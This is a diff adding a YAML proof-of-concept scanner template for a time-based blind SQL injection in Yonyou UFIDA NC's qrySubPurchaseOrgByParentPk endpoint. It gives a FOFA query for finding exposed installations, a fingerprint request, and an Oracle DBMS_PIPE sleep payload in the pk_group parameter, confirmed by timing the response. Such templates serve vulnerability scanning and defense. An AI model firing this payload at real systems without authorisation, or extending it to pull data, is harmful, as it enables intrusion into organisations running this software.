@@ -1,0 +1,22 @@
+id: poc-yaml-yonyou-ufida-nc-qrysubpurchaseorgbyparentpk-sqli
+info:
+  name: 用友NC qrySubPurchaseOrgByParentPk SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: ufida-nc
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: GET
+  path: /
+  expression: status_code == 200 && contains(body,"ufida")
+- method: POST
+  path: /ebvp/register/qrySubPurchaseOrgByParentPk
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: pk_group=1' AND 1337=DBMS_PIPE.RECEIVE_MESSAGE('any',{{.t1}})--
+  expression: status_code == 200 && body == "[]" && duration > t1 && duration < t2
+transport: http
